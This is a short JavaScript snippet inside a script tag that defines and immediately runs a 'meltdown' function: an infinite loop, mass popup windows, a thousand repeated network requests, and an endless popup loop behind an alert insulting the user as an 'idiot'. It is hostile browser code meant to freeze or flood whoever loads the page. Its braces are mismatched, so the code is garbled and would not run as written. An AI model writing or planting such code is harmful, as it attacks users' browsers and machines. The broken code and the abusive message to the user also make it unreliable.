<script>
function meltdown() {
  let arr = [];
  try {
    while (true) {

      }
      for(let i = 0; i < 50; i++){
        window.open("about:blank"); // popup hell intensified
      }
      for (let i = 0; i < 1000; i++) {
        fetch('https://example.com/').then(() => console.log('request fired')); //Fires off many network requests
      }
    }
  } catch (e) {
    console.error("System meltdown initiated. You asked for it, idiot.");
    alert("System meltdown initiated. You asked for it, idiot.");
    while(true){
      window.open("about:blank"); // never ending pop up hell
    }
  }
}
meltdown();
